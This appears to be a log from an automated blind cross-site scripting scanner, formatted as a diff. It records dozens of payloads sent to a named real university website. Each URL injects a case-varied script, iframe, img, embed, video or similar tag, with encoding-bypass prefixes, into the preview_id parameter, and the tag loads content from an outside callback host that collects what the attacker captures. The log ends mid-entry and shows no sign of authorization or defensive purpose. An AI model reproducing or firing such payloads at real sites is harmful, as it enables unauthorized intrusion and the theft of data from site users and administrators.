@@ -1,0 +1,200 @@
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CsoUrCE+srC%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FsoUrCE%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CemBeD+SRC%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FemBeD%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%253E%253c%3CVIDEo+Src%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FVIDEo%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3Cimg+hREf%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2Fimg%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%2F%3E%2520%3C%3CvIdEO+HRef%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FvIdEO%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CIMG+hreF%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FIMG%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CIMg+hREf%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FIMg%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3E%22%3C%3CsCriPt+hREF%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FsCriPt%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CvIdeO+href%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FvIdeO%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%253e%253c%3CViDEO+sRC%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FViDEO%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%27%3E%5C%22%3CSCript+hreF%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FSCript%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CIMG+srC%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FIMG%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3Ca+SRc%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2Fa%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%2520%2F%2520%3E%3CIfRamE+srC%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FIfRamE%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=.%2F%3E%2520%3C.%2F%3CScRiPt+SRc%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FScRiPt%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=pjw%3D%3CScRipT+sRC%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FScRipT%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=.%2F%3E%2520%3C.%2F%3CIFRAme+HReF%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FIFRAme%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%2520%22%3E%2520%3C%3CSCRIPT+HrEf%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FSCRIPT%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CA+HrEF%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FA%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CBODy+HREF%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FBODy%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%2F%3E%2520%3C%3CiMg+HRef%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FiMg%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CembEd+hReF%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FembEd%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CIMG+sRc%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FIMG%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CAUDIo+hrEf%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FAUDIo%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CbODY+sRC%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FbODY%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CEMBED+srC%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FEMBED%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3Ca+href%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2Fa%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=.%5C%3E%22%3C%2F.%3CvidEo+href%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FvidEo%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%2520%2F%2520%3E%3CIframe+src%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FIframe%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3E%3C%3CBoDY+hReF%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FBoDY%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%253e%253C%3CembeD+Href%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FembeD%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3E%22%3C%3CeMBEd+hrEf%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FeMBEd%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=.%5C%3E%22%3C%2F.%3CIfrAMe+SRc%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FIfrAMe%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3E%22%3C%3Cembed+srC%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2Fembed%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%2F%3E%2520%3C%3CiFraMe+HRef%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FiFraMe%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=.%5C%3E%22%3C%2F.%3CifRAME+href%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FifRAME%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CIFraMe+HReF%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FIFraMe%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%2F%3E%2520%3C%3CImG+srC%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FImG%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3E%22%3C%3CbODy+hreF%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FbODy%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%27%3E%5C%22%3CVIdeO+sRc%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FVIdeO%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3Cimg+hrEF%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2Fimg%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3E%22%3C%3CbOdy+HrEf%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FbOdy%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CboDY+HREf%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FboDY%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3E%22%3C%3CSOuRCe+hREf%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FSOuRCe%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%5C%22%3E%3CvIDEO+HReF%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FvIDEO%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=.%2F%3E%2520%3C.%2F%3CVIDeo+sRC%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FVIDeo%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=.%5C%3E%22%3C%2F.%3CAudIO+HrEf%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FAudIO%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%27%3E%5C%22%3CembEd+sRc%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FembEd%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%27%3E%5C%22%3CscRipT+Href%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FscRipT%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=pJW%3D%3CsoUrcE+Src%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FsoUrcE%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%27%3E%5C%22%3CSOuRce+src%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FSOuRce%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CeMbed+srC%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FeMbed%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CembeD+Src%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FembeD%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CEmBED+href%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FEmBED%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%253e%253c%3CImG+src%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FImG%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CscRiPT+HReF%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FscRiPT%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CVidEo+hRef%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FVidEo%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3E%3C%3CifRAme+HReF%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FifRAme%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CaUdio+SrC%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FaUdio%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=pJw%3D%3CiMg+srC%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FiMg%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3Ca+SrC%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2Fa%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CEmBeD+SRc%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FEmBeD%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%2F%3E%2520%3C%3CscrIpt+HRef%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FscrIpt%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%27%3E%5C%22%3CsCripT+hReF%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FsCripT%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%27%3E%5C%22%3CScrIpt+srC%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FScrIpt%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CifRAme+HREf%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FifRAme%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CVIdeo+Src%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FVIdeo%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=.%5C%3E%22%3C%2F.%3CVIDEo+src%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FVIDEo%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CemBED+hreF%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FemBED%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3C%22%3CboDY+HREf%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FboDY%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CaUdIO+HReF%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FaUdIO%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CScriPt+hRef%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FScriPt%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%2520%22%3E%2520%3C%3CSCRipT+sRc%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FSCRipT%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CiMg+src%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FiMg%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3Ca+SRC%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2Fa%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CIFRAmE+sRC%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FIFRAmE%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%3CemBeD+sRc%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FemBeD%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
+https://huflit.edu.vn/new/sinh-vien-khoa-quan-he-quoc-te-tham-du-bao-cao-chuyen-de-american-government-and-democractic-principles-cung-giao-su-mark-tiller/?preview_id=%2520%22%3E%2520%3C%3CIFramE+Href%3D%22https%3A%2F%2Fxss.report%2Fc%2Faptx4869%22%3E%3C%2FIFramE%3E&preview_nonce=4c13429dd3&preview=true
+Blind XSS payload sent:
